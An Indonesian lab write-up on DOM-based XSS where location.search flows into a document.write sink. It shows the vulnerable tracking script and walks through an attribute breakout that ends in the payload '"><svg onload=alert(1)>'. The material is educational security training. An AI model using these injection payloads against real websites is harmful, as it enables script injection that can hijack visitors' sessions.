# DOM XSS in `document.write` sink using source `location.search`

Kerentanan ini menggunakan JavaScript. fungsi `document.write`  yang menulis data ke halaman. Fungsi `document.write`  dipanggil dengan data dari `location.search`, yang dapat Anda kendalikan menggunakan URL situs web. 



Contoh code di Inspect:


```html
<section class="blog-header">
<h1>0 search results for '&lt;script&gt;alert(1)&lt;/script&gt;'</h1><hr>
</section>
```

```html
<img src="/resources/images/tracker.gif?searchTerms=&lt;script&gt;alert(1)&lt;/script&gt;">
```


```js
<script>
function trackSearch(query) {
document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}

var query = (new URLSearchParams(window.location.search)).get('search');

if (query) {
trackSearch(query);
}
</script>
```
--- 

## Cara Inject 
1. Masukkan rangkaian karakter alfanumerik acak ke dalam kotak pencarian.Contoh : `1amkaiz3n`
2. Klik kanan dan periksa elemen tersebut, lalu perhatikan bahwa string acak Anda telah ditempatkan di dalam sebuah atribut `img src` .
   - `<img src="/resources/images/tracker.gif?searchTerms=1amkaiz3n">`
3. Keluar dari atribut `img`  dengan menggunakan:
   - `">`
4. Lihat di elemen akan jadi seperti ini:
   - `<img src="/resources/images/tracker.gif?searchTerms=">
      1amkaiz3n">`
5. Seletam keluar dari element,saatnnya masukkan payload :
   - `"><svg onload=alert(1)>`
